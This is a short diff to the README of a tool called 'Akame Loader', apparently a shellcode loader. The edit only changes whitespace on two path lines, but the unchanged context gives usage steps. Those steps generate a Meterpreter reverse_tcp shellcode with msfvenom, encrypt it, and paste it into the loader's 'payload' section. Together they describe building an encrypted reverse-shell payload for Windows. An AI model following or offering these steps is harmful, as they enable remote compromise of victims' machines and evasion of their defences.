@@ -10,8 +10,8 @@
 **1. Generate a shellcode with metasploit<br>**
 msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<IP> LPORT=<PORT> -f raw > shellcode.bin <br>
 **2. Encrypt your shellcode with encrypt.exe<br>**
-mv shellcode.bin \Akame Loader\x64\Release\Resources\<br>
-cd \Akame Loader\x64\Release\Resources\<br>
+mv shellcode.bin \Akame Loader\x64\Release\Resources\ <br>
+cd \Akame Loader\x64\Release\Resources\ <br>
 (optional) encrypt --help<br>
 encrypt.exe -l cpp -m shellcode.bin -e random -o cli<br>
 **3. Copy the output and paste it under the "payload" comment<br>**
